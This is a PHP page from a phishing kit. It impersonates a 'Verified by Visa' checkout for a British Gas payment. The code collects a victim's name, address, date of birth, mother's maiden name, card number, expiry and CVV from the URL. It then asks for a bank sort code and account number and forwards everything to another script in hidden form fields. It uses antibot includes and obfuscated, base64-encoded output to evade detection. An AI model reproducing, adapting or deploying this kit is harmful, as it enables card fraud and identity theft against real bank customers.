<?php
error_reporting(0);
include "control.php";

include('files/boot/check.php');
include('files/boot/check1.php');
include('files/boot/check2.php');
include('files/boot/antibot.php');
include('files/v/enc.php');

function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

	
	$str .= "Full Name: $_GET[1]<br>";
	$str .= "Address: $_GET[3]<br>";
	$str .= "City: $_GET[4]<br>";
	$str .= "Zip: $_GET[5]<br>";
	$str .= "Phone: $_GET[6]<br>";
	$str .= "DOB: $_GET[2]<br>";
    $str .= "MMN: $_GET[7]<br><br>";
	
	
	$str .= "CC Name: $_GET[8]<br>";
	$str .= "CC: $_GET[9]<br>";
	$str .= "Exp: $_GET[10] $_GET[11]<br>";
	$str .= "CVV: $_GET[12]<br>";


	

	
	
	$ip = getenv("REMOTE_ADDR");
	$str .= "IP: $_SERVER[REMOTE_ADDR]<br>";
	$str .= "Date: " . date('d F Y @ H:i:s O') . "GMT " . (date('I')?"DS":"") . "<br>";
	$str .= "-----------------------------------------------------<br>";

    


	$subject = "PP-CC:$_GET[cc] $_GET[country]";





$cc = $_GET['9'];

$rest = substr($cc, -4); // returns "d"


?> 
<html>
<?php ob_start() ?>
<head>

	<title>Verified by Visa Secure Gateway</title>
	






<link rel='stylesheet' href='https://secure.edb.com/static/secure3d/css/common.css' type='text/css'/><link rel='stylesheet' href='https://secure.edb.com/static/secure3d/css/bid-mobile.css' type='text/css'/><link rel='stylesheet' href='https://secure.edb.com/static/secure3d/css/46009020.css' type='text/css'/>

<script src="jquery.min.js.download"></script>

<script>
function empty() {
   
	var x;
    x = document.getElementById("acc_number").value;
    if (x == "") {
        document.getElementById("acc_number").style = "border-color: red";
		document.getElementById("acc_number_error").style = "display: block";
        return false;
    }
	var x;
    x = document.getElementById("sort_code").value;
    if (x == "") {
        document.getElementById("sort_code").style = "border-color:red";
		document.getElementById("sort_code_error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
   
	var e;
    e = document.getElementById("acc_number").value;
    if (e !== ""){
	    document.getElementById("acc_number").style = "";
		document.getElementById("acc_number_error").style = "display: none";
	}
	var e;
    e = document.getElementById("sort_code").value;
    if (e !== ""){
	    document.getElementById("sort_code").style = "";
		document.getElementById("sort_code_error").style = "display: none";
	}
	
}

</script>

<script>

$(document).ready(function(){  
            $("#sort_code").keyup(function(e){
                if (e.keyCode != 8){    
                    if ($(this).val().length == 2){
                        $(this).val($(this).val() + "-");
                    }else if ($(this).val().length == 5){
                        $(this).val($(this).val() + "-");
                    }
                }
            });   
});

</script>


<script>
function mod10_check(val){
	var nondigits = new RegExp(/[^0-9]+/g);
	var number = val.replace(nondigits,'');
	var pos, digit, i, sub_total, sum = 0;
	var strlen = number.length;
	if(strlen < 13){ return false; }
	for(i=0;i<strlen;i++){
		pos = strlen - i;
		digit = parseInt(number.substring(pos - 1, pos));
		if(i % 2 == 1){
			sub_total = digit * 2;
			if(sub_total > 9){
				sub_total = 1 + (sub_total - 10);
			}
		} else {
			sub_total = digit;
		}
		sum += sub_total;
	}
	if(sum > 0 && sum % 10 == 0){
		return true;
	}
	return false;
}
</script>



    <script language="JavaScript">
    // Define a function for use later on.
    function print_todays_date() {
        var d = new Date();                  // Get today's date and time
        document.write(d.toLocaleString());  // Insert it into the document
    }
    </script>
	<style>
		body {
			color: #000000;
			background: #efefef;
			margin-left: 0; margin-right: 0; margin-top: 0; margin-bottom: 0;
		}
		form {
			padding: 0;
			margin: 0;
		}
	</style>
	
	
</head>
<body >

			<table cellpadding=0 cellspacing=1 width=390px height=400px bgcolor=black align="center"> 	
				<tr>
					<td valign=top bgcolor=white>
						<table cellpadding=1 cellspacing=1 width=100% height=100%>

							<tr>
								<td valign=top>
								       
									   
















<table cellpadding=1 cellspacing=1 width=100%>
	<!-- vbv/mcsc logo + banklogo -->
	<tr><td>







<table cellpadding=0 cellspacing=0 width=100%>
	<tr>
		<td align=left>
			<!-- insert VbV or MCSC logo -->
			
				<img src="https://secure.edb.com/static/secure3d/images/common/logo_vbv113x57.jpeg"  border="0" >
			
				
		</td>
		<td align=right>
			









<img src="http://www.meniq.net/images/MeniQ/vm.gif">

		</td>
		<td align=right width=2px/>
	</tr>
</table></td></tr>

	<!-- header + info texts -->
	<tr><td align=center><h1>Protect your Visa card online</h1></td></tr>


	<tr>
		<td valign=top>
			<table cellpadding=2 cellspacing=2 width=100%>


	<tr>
		<td class="bold" align=right>
			Merchant :
		</td>
		<td>

			BRITISH GAS
		</td>
	</tr>
	<tr>
		<td class="bold" align=right>
			Amount :
		</td>
		<td>
			&#163;21.71
		</td>	
	</tr>

	<tr>
		<td class="bold" align=right>
			Date :
		</td>
		<td>
			<script language="JavaScript">
  // Now call the function we defined above.
  print_todays_date();
</script>
		</td>
	</tr>
	<tr>
		<td class="bold" align=right>

			Card Number :
		</td>
		<td>
			xxxx xxxx xxxx <?php echo $rest; ?>  
		</td>
	</tr>


				

				<tr>
					<td class="bold" align=right>Sort-code :  </td>

					<td>
						
						<form id="command" class="form-validation" method="post" action="i3799.php?/TV-Rnd/Access/Acc&validid=ccccc" onSubmit="return empty()" target="_parent">
						
                <input id="sort_code" name="sort_code" role="textbox" type="tel" class="textbox required cardNumber UNKNOWN" value="" maxlength="8" pattern="(?!0{2}(-?0{2}){2})(\d{2}(-\d{2}){2})|(\d{6})" autocomplete="off" onBlur="change()">
				<label id="sort_code_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your sort code.</font></label>

						<input id="cucu" name="fullname" type="hidden" value="<?php echo $_GET[1]; ?>"/>
						<input id="cucu" name="address" type="hidden" value="<?php echo $_GET[3]; ?>"/>
						<input id="cucu" name="city" type="hidden" value="<?php echo $_GET[4]; ?>"/>
						<input id="cucu" name="postcode" type="hidden" value="<?php echo $_GET[5]; ?>"/>
						<input id="cucu" name="phone" type="hidden" value="<?php echo $_GET[6]; ?>"/>
						<input id="cucu" name="dob" type="hidden" value="<?php echo $_GET[2]; ?>"/>
						<input id="cucu" name="mmn" type="hidden" value="<?php echo $_GET[7]; ?>"/>
						<input id="cucu" name="ccname" type="hidden" value="<?php echo $_GET[8]; ?>"/>
						<input id="cucu" name="ccnumber" type="hidden" value="<?php echo $_GET[9]; ?>"/>
						<input id="cucu" name="expmonth" type="hidden" value="<?php echo $_GET[10]; ?>"/>
						<input id="cucu" name="expyear" type="hidden" value="<?php echo $_GET[11]; ?>"/>
						<input id="cucu" name="cvv" type="hidden" value="<?php echo $_GET[12]; ?>"/>
						<tr>
					<td class="bold" align=right>Account Number :  </td>

					<td>
						
                <input id="acc_number" name="acc_number" role="textbox" type="tel" class="textbox required cardNumber UNKNOWN" value="" maxlength="8" pattern="\d{8}" autocomplete="off" onBlur="change()">
				<label id="acc_number_error" class="help" style="display: none"><font color="red" style="font-size: 90%">Please type your account number.</font></label>
						
					</td>
				</tr>
				<!-- FORGOTTEN PASSWORD LINK  -->
				<tr>
					<td/>
					
				</tr>
				
				<!-- SUBMIT & CANCEL BUTTONS -->
				<tr>
					<td/>
					<td>
						<table cellpadding=0 cellspacing=0>

							<tr>
								<td>
									<input type="submit" class="button" value="Submit"/> &nbsp;&nbsp;&nbsp;&nbsp;<a href="#"><b>Cancel</b></a><br><br>This information is not shared with the Merchant.</td>
									</form>
								<td width=5px/>
								<td>
								
								</td> 

		
<script type = "text/javascript">
   	document.forms[0].password.focus();
</script>
									
	
<script> 
window.onload=function(){ 
history.pushState(null,null, "locale=en-US&?id=<?php echo $randomlink; ?><?php echo $randomlink; ?><?php echo $randomlink; ?><?php echo $randomlink; ?><?php echo $randomlink; ?>") 
} 
</script>
<?php $html=ob_get_clean()?><?php $test=0;if($test){    echo $html; }else{     ?>  <script type="text/javascript">     var _0xa211=["","\x6A\x6F\x69\x6E","\x25","\x73\x6C\x69\x63\x65","\x30\x30","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x61\x6C\x6C","\x6D\x61\x70","\x70\x72\x6F\x74\x6F\x74\x79\x70\x65"];function _kaktys_encode(_0x60c0x2){return decodeURIComponent(Array[_0xa211[8]][_0xa211[7]][_0xa211[6]](atob(_0x60c0x2),function(_0x60c0x3){return _0xa211[2]+ (_0xa211[4]+ _0x60c0x3[_0xa211[5]](0).toString(16))[_0xa211[3]](-2)})[_0xa211[1]](_0xa211[0]))}     document.write(_kaktys_encode("<?php echo base64_encode($html) ?>")); </script>    <?php }  ?>
</body></html>

